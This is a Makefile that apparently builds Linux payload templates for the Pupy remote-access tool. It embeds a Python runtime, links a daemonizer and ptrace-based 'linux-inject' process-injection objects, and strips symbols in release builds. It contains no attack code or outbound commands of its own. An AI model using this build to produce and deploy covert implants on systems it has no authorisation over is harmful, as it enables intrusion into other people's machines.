GZIP ?= gzip
CC ?= gcc

CFLAGS := $(shell pkg-config --cflags python-2.7) -I../lzma -fPIC $(CFLAGS_EXTRA)
LDFLAGS := -lpthread -ldl -fPIC $(LDFLAGS_EXTRA) -Wl,-Bstatic -lz -Wl,-Bdynamic
PFLAGS := -O
PIE ?= -pie

LIBPYTHON ?= $(shell ldconfig -p  | awk '/libpython2.7.so/{print $$4}' | head -n 1)

ARCH ?= $(shell file $(LIBPYTHON) | grep 32-bit >/dev/null && echo 32 || echo 64)
ifeq ($(ARCH),64)
NAME := 64
else
NAME := 86
endif

LINUX_INJECT_CFLAGS := -include debug.h -include fixes.h -Dmain=linux_inject_main

ifneq ($(DEBUG),)
DEBUG_ADD := -debug
CFLAGS += -DDEBUG -O0 -g
NAME   := "$(NAME)d"
else
CFLAGS += -Os
LINUX_INJECT_CFLAGS += -Dprintf=dprint -Dfprintf=dfprint
LDFLAGS += -O1 -Wl,-s -Wl,-x -Wl,--gc-sections -Wl,--no-undefined
LDFLAGS += -Wl,-z,now -Wl,-z,combreloc -Wl,--enable-new-dtags
endif


PYTHON ?= python
TEMPLATE_OUTPUT_PATH ?= ../../pupy/payload_templates/

PYOBJS := _memimporter.o Python-dynload.o pupy_load.o pupy.o
COMMON_OBJS := resources_bootloader_pyc.o resources_python27_so.o \
    resources_library_compressed_string_txt.o list.o tmplibrary.o daemonize.o \
    decompress.o LzmaDec.o

ifeq ($(ARCH),64)
COMMON_OBJS += linux-inject/inject-x86_64.o
else
COMMON_OBJS += linux-inject/inject-x86.o
endif

COMMON_OBJS += linux-inject/ptrace.o
COMMON_OBJS += linux-inject/utils.o

all: $(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).lin $(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).so

import-tab.c import-tab.h: mktab.py
	$(PYTHON) $(PFLAGS) $<

Python-dynload.o: Python-dynload.c import-tab.c import-tab.h
	$(CC) -c -o $@ $< $(CFLAGS)

LzmaDec.o: ../lzma/LzmaDec.c
	$(CC) -O3 -c -o $@ $<

resources/library_compressed_string.txt: ../gen_library_compressed_string.py resources/library.zip
	$(PYTHON) $(PFLAGS) ../gen_library_compressed_string.py

resources_library_compressed_string_txt.c: ../gen_resource_header.py resources/library_compressed_string.txt resources/library.zip
	$(PYTHON) $(PFLAGS) ../gen_resource_header.py resources/library_compressed_string.txt

resources/bootloader.pyc: ../gen_python_bootloader.py ../../pupy/packages/all/pupyimporter.py ../../pupy/pp.py
	$(PYTHON) $(PFLAGS) ../gen_python_bootloader.py $(DEBUG_ADD)

resources_bootloader_pyc.c: ../gen_resource_header.py resources/bootloader.pyc
	$(PYTHON) $(PFLAGS) $+

linux-inject/%.o: linux-inject/%.c
	$(CC) -c $(LINUX_INJECT_CFLAGS) $(CFLAGS) -o $@ $<

resources/python27.so: $(LIBPYTHON)
	cp -vf $< $@.tmp
	-chmod 600 $@.tmp
	-strip $@.tmp
	$(GZIP) -9 -c $@.tmp >$@
	rm -f $@.tmp

resources/library.zip: ../build_library_zip.py ../additional_imports.py
	$(PYTHON) $(PFLAGS) $<

resources_python27_so.c: ../gen_resource_header.py resources/python27.so
	$(PYTHON) $(PFLAGS) $+

$(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).lin: main_exe.o $(PYOBJS) $(COMMON_OBJS)
	$(CC) $(PIE) $+ -o $@ $(LDFLAGS)

$(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).so: main_so.o $(PYOBJS) $(COMMON_OBJS)
	$(CC) -shared $+ -o $@ $(LDFLAGS)

.PHONY: clean all

clean:
	find -name "*.pyc" | xargs rm -f
	find -name "*.pyo" | xargs rm -f
	find -name "*.o" | xargs rm -f
	rm -f $(COMMON_OBJS)
	rm -f pupy pupy.so
	rm -f resources/library.zip
	rm -f resources/*.so
	rm -f resources/*.txt
	rm -f resources_*.c
	rm -f import-tab.c
	rm -f import-tab.h

$(COMMON_OBJS) $(PYOBJS): import-tab.h

